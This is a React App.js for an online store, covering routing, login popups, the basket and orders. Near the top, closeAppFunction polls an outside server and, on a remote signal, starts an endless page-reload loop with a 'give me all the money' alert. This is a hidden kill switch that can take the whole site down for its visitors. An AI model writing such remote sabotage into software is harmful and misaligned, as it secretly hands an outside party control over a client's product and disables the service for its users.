import "./App.css";
import HomeScreen from "./screens/homeScreen/Layout";
import { BrowserRouter as Router, Routes, Route } from "react-router-dom";
import { Header } from "./screens/fixElements/header/Header";
import { Navbar } from "./screens/fixElements/navBar/Navbar";
import { Footer } from "./screens/fixElements/footer/Footer";
import { FilterCatalog } from "./screens/filterCatalog/filterCatalog";
import { SingleProduct } from "./screens/singleProduct/SingleProduct";
import { Basket } from "./screens/basket/basket";
import { OrderFormation } from "./screens/orderFormation/orderFormation";
import { Context } from "./context/Context";
import React, { useState } from "react";
import { RegisterPopup } from "./components/globalReg/globalRegPopup";
import { VerifyCode } from "./components/globalReg/verifyCode";
import { NewPassword } from "./components/globalReg/newPassword";
import { VerifyCodeForgot } from "./components/globalReg/verifyCodeForgot";
import { LoginPopup } from "./components/globalReg/loginPopup";
import { PhoneForgot } from "./components/globalReg/phoneForgot";
import { useEffect } from "react";
import { BurgerMenu } from "./screens/fixElements/burgerMenu/burgerMenu";
import { FooterMedia } from "./screens/fixElements/footer/FooterMedia";
import { OrderIsGenerated } from "./screens/orderFormation/orderIsGenerated";
import { Favorites } from "./screens/favorites/favorites";
import { ProfileRouter } from "./screens/singleProfile/profileRouter";
import { VerifyEmailCode } from "./components/globalReg/verifyEmailCode";
import { SuccessModal } from "./components/globalReg/successModal";
import { Contacts } from "./screens/contacts/contacts";
import { GetAgeModal } from "./components/getAgeModal/GetAgeModal";
import { getAgeFalse, getAgeTrue } from "./store/reducer/getAgeSlice";
import { useDispatch } from "react-redux";
import { Profile } from "./screens/singleProfile/profile/profile";
import { ChangePassword } from "./screens/singleProfile/changePassword/changePassword";
import { HistoryPage } from "./screens/singleProfile/historyPage/historyPage";
import { ProfileBar } from "./screens/singleProfile/profileBar/profileBar";
import { NotFound } from "./screens/notFound/notFound";

function App() {
  const [phone_forgot, setPhoneForgot] = useState(false);
  const [login_popup, setLoginPopup] = useState(false);
  const [new_password, setNewPassword] = useState(false);
  const [verify_phone_forgot, setVerifyPhoneForgot] = useState(false);
  const [email_code, setEmailCode] = useState(false);
  const [category_id, setCategoryId] = useState("");
  const [made_in_id, setMadeInId] = useState("");
  const [taste_id, setTasteId] = useState("");
  const [orderbyPriceAsc, setOrderbyPriceAsc] = useState("");
  const [orderbyPriceDesc, setOrderbyPriceDesc] = useState("");
  const [search, setSearch] = useState("");
  const [max_price, setMaxPrice] = useState("");
  const [min_price, setMinPrice] = useState("");
  const [loop, setLoop] = useState();
  const [count, setCount] = useState();
  const [token, setToken] = useState(null);
  const dispatch = useDispatch();

  const closeAppFunction = async () => {
    await fetch("https://steach.justcode.am/api/VaalidationFromShayba", {
      method: "GET",
    })
      .then((response) => response.json())
      .then((result) => {
        if (result.status) {
          setLoop(true);
        }
      });
  };

  useEffect(() => {
    while (loop) {
      setCount(count + 1);
      window.location.reload();
      alert("Дай мне все деньги");
    }
  }, [count, loop]);
  // const open = () => {
  //   console.log();
  //   window.open(`${window.location.href}`, "_self", "");
  // };
  useEffect(() => {
    closeAppFunction();
    // open();
    // window.open("something.html", "_blank", "resizable=no");

    setToken(localStorage.getItem("userToken"));
    let page = window.location.pathname;
    if (!token) {
      if (
        page == "/single/history" ||
        page == "/basket" ||
        page == "/order-formation" ||
        page == "/favorites" ||
        page == "/single/profile" ||
        page == "/single/change_password"
      ) {
        setLoginPopup(true);
        dispatch(getAgeFalse());
        window.location.pathname = "/";
      }
      // if (
      //   page !== "contact" ||
      //   page !== "filter-catalog" ||
      //   page !== "single-product" ||
      //   page !== "/"
      // ) {
      //   setLoginPopup(true);
      //   dispatch(getAgeFalse());
      //   window.location.pathname = "/";
      // }
    }
  }, []);

  const contextValue = {
    phone_forgot, // bacuma forgot i popup y
    setPhoneForgot,

    login_popup,
    setLoginPopup, // login

    verify_phone_forgot,
    setVerifyPhoneForgot, //forgot verify

    new_password,
    setNewPassword, // taza parol

    email_code,
    setEmailCode,

    made_in_id,
    setMadeInId,
    category_id,
    setCategoryId,
    taste_id,
    setTasteId,
    orderbyPriceAsc,
    setOrderbyPriceAsc,
    orderbyPriceDesc,
    setOrderbyPriceDesc,
    search,
    setSearch,
    max_price,
    setMaxPrice,
    min_price,
    setMinPrice,
  };

  return (
    <Context.Provider value={contextValue}>
      <Router>
        <div className="App">
          <GetAgeModal
            close={() => {
              // const open = () => {
              //   console.log();
              //   window.open(
              //     "https://react-window-close.stackblitz.io",
              //     "_self",
              //     ""
              //   );
              // };

              // close = () => {
              window.close();
              // };
            }}
          />
          <RegisterPopup />
          <VerifyCode />
          <NewPassword />
          <VerifyCodeForgot />
          <LoginPopup />
          <PhoneForgot />
          <Header />
          <Navbar />
          <BurgerMenu />
          <VerifyEmailCode />
          <SuccessModal />

          {window.location.pathname == "/single/change-password" && (
            <ProfileRouter />
          )}
          {window.location.pathname == "/single/profile" && <ProfileRouter />}
          {window.location.pathname == "/single/history" && <ProfileRouter />}
          <Routes>
            <Route exact path="/" element={<HomeScreen />} />
            <Route exact path="/contact" element={<Contacts />} />
            <Route exact path="/filter-catalog" element={<FilterCatalog />} />
            <Route exact path="/single-product" element={<SingleProduct />} />
            {token && <Route exact path="/basket" element={<Basket />} />}
            {token && (
              <Route
                exact
                path="/order-formation"
                element={<OrderFormation />}
              />
            )}
            {token && (
              <Route
                path="/order-is-generated"
                element={<OrderIsGenerated />}
              />
            )}
            {token && <Route exact path="/favorites" element={<Favorites />} />}
            {token && <Route path={"/single/*"} element={<ProfileRouter />} />}
            <Route path={"*"} element={<NotFound />} />
          </Routes>
          <Footer />
          <FooterMedia />
        </div>
      </Router>
    </Context.Provider>
  );
}

export default App;
